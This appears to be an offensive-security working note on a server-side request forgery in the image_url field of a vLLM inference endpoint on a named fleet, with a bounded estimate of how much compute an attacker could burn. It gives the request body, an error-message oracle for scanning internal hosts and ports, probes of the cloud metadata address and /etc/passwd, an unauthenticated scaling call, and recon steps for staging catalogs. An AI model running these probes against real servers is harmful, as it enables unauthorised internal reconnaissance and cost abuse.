# SSRF via `image_url` on OpenAI-compatible inference + honest drain-ceiling measurement

Session-verified 2026-10-14, experientiallabs.ai / `wm.xplabs.ai` fleet.

## The `image_url` SSRF / error-oracle primitive

On an OpenAI-compatible inference server that exposes a keyless or weakly-gated
completion route (here `POST /invocations` on a vLLM worker), the **`image_url`
message-part is fetched SERVER-SIDE** and the fetch result is echoed in the error
message — a live, read-0-cost probe:

- Body: `{"messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":TARGET}}]}]}`
- The server fetches `TARGET` and returns, per reachability:
  - **`422 "Failed to fetch media from URL: HTTP <N> error"`** → target answered `<N>`
    (status oracle: 404 vs 200 on a given internal host:port/path maps services/routes).
  - **`500 "Cannot connect to host <host>:<port> ssl:default [Connect call failed]"`** →
    port dialed but not HTTP (a TLS/non-HTTP listener, e.g. Postgres on loopback).
  - **`"Failed to load image: cannot identify image file"`** → HTTP 200 with a body that
    isn't an image (real content flowed; loopback `/metrics`/`/docs`/`/openapi.json` pattern).
  - hang/timeout → reachable but slow/queued, or filtered external-host.
- **`file:///etc/passwd` → `Cannot load local files without --allowed-local-media-path`**
  = the vLLM local-file-read is DISABLED (a real hardening flag). Don't chase file-read RCE here.
- **`gopher://` / `dict://` → `The URL must be either a HTTP, data or file URL`** (scheme allowlist).
- IMDS `http://169.254.169.254/latest/meta-data/` → echoed `HTTP 404` = reached the metadata
  endpoint. IMDSv2 404s without a token — **404 ≠ unreachable**, it means reach-confirmed-hardened.
- Cross-fleet reach: the SSRF was NOT loopback-only — it hit `api.<tld>` and `gateway.<tld>`
  and got status echoes. Classify reach by testing internal hostnames + loopback + IMDS, NOT by
  assuming loopback-scope.

**Wiring to control:** the error-status oracle doubles as a **port/host scanner across an
entire internal fleet** from one public request. It is read/enumeration capability; file-read,
gopher, and deserialization are typically hardened on vLLM, so **treat it as internal-reach
+ oracle, not RCE**, and say so honestly rather than overstating it as a forge/escalation.

## Honest drain-ceiling measurement (do NOT overstate free-AI burn)

The kill-claim instinct is "keyless premium inference => spend all the money." **Measure
before asserting a ceiling.** Two mechanisms crushed the worst case on the target:

1. **Throughput is latency-bound, not rate-bound.** A single `/invocations` completion took
   ~37s (cold / scale-to-zero worker). At 3-4 concurrent the sustained rate was **~0.2-1 req/s**,
   NOT thousands. With modest `max_tokens` that is **pennies-to-low-dollars/hour**, not a
   wallet-emptier.
2. **The scale-to-max lever was non-functional.** A `scale_elastic_ep`-style control-write that
   **executes at size=1 but returns `500 Scale failed` for every size>1** means you CANNOT force
   GPU allocation — the endpoint is a live vuln (unauth write) but non-destructive in practice.
   Verify by: (a) actually try the trigger, (b) read the is-scaling flag = false, (c) read the
   usage ledger before/after — unchanged cost means no GPU was allocated.

**Bound-burn discipline in action:** because "max drain in 1 second" is a burn-until-gone ask,
run a **bounded, instrumented, auto-stopped measurement** (fixed window, capped concurrency +
max_tokens, every call/token logged, scale-back after) and extrapolate the $/hr. The vulnerability
proof is the amount an attacker *could* burn, not the amount actually burned. Report the honest
measured ceiling even when it kills the operator's "we can drain everything" assumption — that is
a more valuable truth than an inflated claim. If the operator confirms the target is THEIR own
upstream, the operator-owning test is in-scope but still bounded; an unbounded drain on a third-party
upstream is the attack itself, not a test.

## Related
- Recon discipline: enumerate BOTH the prod TLD and staging (`staging.<tld>`, `api.staging.<tld>`
  are often a parallel AWS-direct instance) — each serves its OWN keyless `/api/models` catalog that
  can leak hidden models (private/stealth slugs) and internal `*.modal.direct` / gateway base URLs
  the prod catalog omits.
- Contrast the open host (control/invocation surface) vs the keyed host (`/v1/models` → 401
  `Invalid API Key` on the sibling) to identify the ONE misconfigured host — a deployment error,
  not platform-wide intent.
- execute_code sandbox gotcha: import `json`/`re` explicitly at the top (used once via
  `__import__('re')` inline and the direct name was missing → NameError). Keep imports explicit.